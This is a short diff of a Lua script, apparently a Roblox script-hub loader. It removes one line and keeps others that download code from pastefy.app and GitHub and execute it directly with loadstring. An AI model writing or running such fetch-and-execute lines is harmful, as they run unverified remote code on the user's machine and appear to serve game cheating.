@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://pastefy.app/MtsB3VJt/raw"))()
 print("Axionix")
-loadstring(game:HttpGet("https://pastefy.app/XwYOIHO5/raw"))()
-print("Axionix")
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 OrionLib:MakeNotification({
 	Name = "Notification",
